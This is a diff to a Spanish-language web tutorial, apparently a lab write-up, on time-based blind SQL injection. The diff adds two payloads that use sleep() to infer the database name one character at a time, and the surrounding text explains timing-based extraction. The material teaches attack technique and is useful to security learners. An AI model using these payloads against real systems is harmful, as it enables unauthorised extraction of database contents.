@@ -583,9 +583,15 @@ $results </span><span class="kd">=</span><span class="k"> mysqli_query</span><sp
 </code></pre></div></div><br>
 
 <div><p>La idea es la misma que anterior pero en lugar de tomar un mensaje tomar el tiempo como base si la condicion se cumple que haga un sleep de varios segundos, como la siguiente query que cumple la condicion que el primer caracter de la base de datos es e por lo que tarda 5 segundos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">1' and if(substr(database(),1,1)='e', sleep(5),1)-- -</span>
+</code></pre></div></div>
 <a href="./21.png" target="_blank"><div><p><img src="./21.png"><p></div></a><br>
 
 <div><p>Cuando la condicion no se cumple no tarda nada por ejemplo cambiamos por i</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">1' and if(substr(database(),1,1)='i', sleep(5),1)-- -</span>
+</code></pre></div></div>
 <a href="./22.png" target="_blank"><div><p><img src="./22.png"><p></div></a><br>
 
 <div><p>Sabiendo esto podemos crear un script que iterando por cada caracter basandose en el tiempo si se ejecuta el sleep y tarda mas de 2 segundos nos muestre el caracter correspondiente</p></div>
